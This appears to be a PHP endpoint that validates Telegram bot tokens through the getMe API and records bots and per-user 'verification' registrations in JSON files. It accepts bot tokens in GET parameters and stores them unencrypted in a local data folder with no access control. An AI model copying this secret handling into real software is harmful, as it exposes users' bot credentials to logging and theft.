<?php
header('Content-Type: application/json; charset=utf-8');

$dataDir = __DIR__ . '/data';

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0755, true);
}

function readJsonFile($file) {
    if (!file_exists($file)) return [];

    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

function writeJsonFile($file, $data) {
    return file_put_contents(
        $file,
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    ) !== false;
}

function curlGet($url) {
    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_USERAGENT => 'DeviceVerification/2.0'
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

$botsFile = $dataDir . '/bots.json';
$registrationsFile = $dataDir . '/registrations.json';

$botHash = $_GET['botHash'] ?? $_POST['botHash'] ?? '';
$botUsername = ltrim($_GET['bot'] ?? $_POST['bot'] ?? '', '@');
$botToken = $_GET['bot_token'] ?? $_POST['bot_token'] ?? '';
$webhookUrl = $_GET['webhook_url'] ?? $_POST['webhook_url'] ?? '';
$botId = (string)($_GET['bot_id'] ?? $_POST['bot_id'] ?? '');
$userId = (string)($_GET['user_id'] ?? $_POST['user_id'] ?? '');

if (!$botHash || strlen($botHash) !== 34) {
    http_response_code(400);
    echo json_encode(['ok'=>false, 'msg'=>'Invalid botHash']);
    exit;
}

if (!$botToken || !$botId || !$userId) {
    http_response_code(400);
    echo json_encode(['ok'=>false, 'msg'=>'Missing registration details']);
    exit;
}

$parsed = parse_url($webhookUrl);

if (
    !$parsed ||
    ($parsed['scheme'] ?? '') !== 'https' ||
    empty($parsed['host'])
) {
    http_response_code(400);
    echo json_encode(['ok'=>false, 'msg'=>'Invalid HTTPS webhook URL']);
    exit;
}

/* Verify bot token */
$checkJson = curlGet(
    'https://api.telegram.org/bot' . $botToken . '/getMe'
);

$checkData = json_decode($checkJson ?: '', true);

if (!($checkData['ok'] ?? false)) {
    http_response_code(401);
    echo json_encode(['ok'=>false, 'msg'=>'Telegram bot token validation failed']);
    exit;
}

$finalUsername = $checkData['result']['username'] ?? $botUsername;

$bots = readJsonFile($botsFile);
$registrations = readJsonFile($registrationsFile);

$responseId = '';

/* Find or create bot */
$found = false;

foreach ($bots as &$bot) {
    if (
        ($bot['bot_username_clean'] ?? '') === $finalUsername
    ) {
        $bot['bot_token'] = $botToken;
        $bot['last_activity'] = date('Y-m-d H:i:s');
        $responseId = $bot['id'];
        $found = true;
        break;
    }
}
unset($bot);

if (!$found) {
    $responseId = bin2hex(random_bytes(8));

    $bots[] = [
        'id' => $responseId,
        'bot_username' => '@' . $finalUsername,
        'bot_username_clean' => $finalUsername,
        'bot_token' => $botToken,
        'created_at' => date('Y-m-d H:i:s'),
        'last_activity' => date('Y-m-d H:i:s')
    ];
}

/* One registration per user verification session */
$registrations = array_values(array_filter(
    $registrations,
    function($r) use ($botHash) {
        return ($r['bot_hash'] ?? '') !== $botHash;
    }
));

$registrations[] = [
    'bot_hash' => $botHash,
    'bot_id' => $botId,
    'user_id' => $userId,
    'bot_username' => $finalUsername,
    'webhook_url' => $webhookUrl,
    'bot_token' => $botToken,
    'created_at' => date('Y-m-d H:i:s')
];

if (
    !writeJsonFile($botsFile, $bots) ||
    !writeJsonFile($registrationsFile, $registrations)
) {
    http_response_code(500);
    echo json_encode(['ok'=>false, 'msg'=>'Database write failed']);
    exit;
}

echo json_encode([
    'ok' => true,
    'msg' => 'Registration successful',
    'id' => $responseId,
    'bot' => '@' . $finalUsername
]);
?>
